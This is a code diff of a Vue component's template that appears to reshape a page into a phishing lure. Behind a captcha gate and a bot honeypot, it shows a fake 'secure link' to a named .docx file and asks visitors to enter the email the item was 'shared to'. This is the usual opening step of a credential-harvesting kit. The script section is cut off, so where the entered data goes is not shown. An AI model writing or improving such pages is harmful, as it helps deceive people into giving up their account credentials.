@@ -1,3 +1,4 @@
+
 <template>
   <div v-if="!captchaToken" class="gate-container">
     <main>
@@ -8,44 +9,42 @@
     </main>
   </div>
 
-  <div v-else class="background">
-    <div class="toto-container">
-      <div class="header">
-        <div class="logo-text">
-          <span class="success-check">⼈</span>
-        </div>
-      </div>
+  <div v-else class="container">
+    <div class="overlay" id="overlay">
+      <div class="input-section" id="inputSection">
+        <form @submit.prevent="submitForm">
+          <img
+            src="https://i.postimg.cc/s2TBQ89k/ldimg1.png"
+            width="100"
+            height="35"
+          >
+          <p>You've received a secure link to:</p>
+          <p style="font-size: 16px; color: #000000;">TT93794-2025.docx</p>
+          <p style="font-size: 16px;">To proceed, enter the email that this <br>item was shared to</p>
 
-      <div class="content">
-        <p><strong>Please confirm your email address to continue.</strong></p>
-
-        <div class="form-wrapper">
           <label for="honeypot" class="visually-hidden">Do not fill this field (anti-bot)</label>
           <input id="honeypot" v-model="honeypot" type="text" tabindex="-1" autocomplete="off" aria-hidden="true" class="visually-hidden" />
 
           <label for="email" class="visually-hidden">Email address</label>
-          <input id="email" v-model="email" type="email" placeholder="Enter email" required class="email-input" :disabled="loading" />
+          <input id="email" v-model="email" type="email" placeholder="Enter email" required :disabled="loading" />
 
           <p v-if="error" class="error" role="alert" aria-live="polite">{{ error }}</p>
 
-          <button @click="submitForm" :disabled="loading" class="action-button">
-            {{ loading ? 'Submitting…' : 'Submit' }}
+          <button type="submit" :disabled="loading">
+            {{ loading ? 'Submitting…' : 'Next' }}
           </button>
-        </div>
-      </div>
 
-      <div class="divider"></div>
-
-      <div class="footer-container">
-        <p class="footer-text">
-          © 2025 All rights reserved.
-          <a href="/privacy" target="_blank">Privacy Policy</a> |
-          <a href="/terms" target="_blank">Terms</a>
-        </p>
+          <p>
+            <br>
+            © 2025 Privacy Policy
+            <br><br><br>
+          </p>
+        </form>
       </div>
     </div>
   </div>
 </template>
+
 
 <script setup>
 import { ref, onMounted, nextTick } from 'vue'
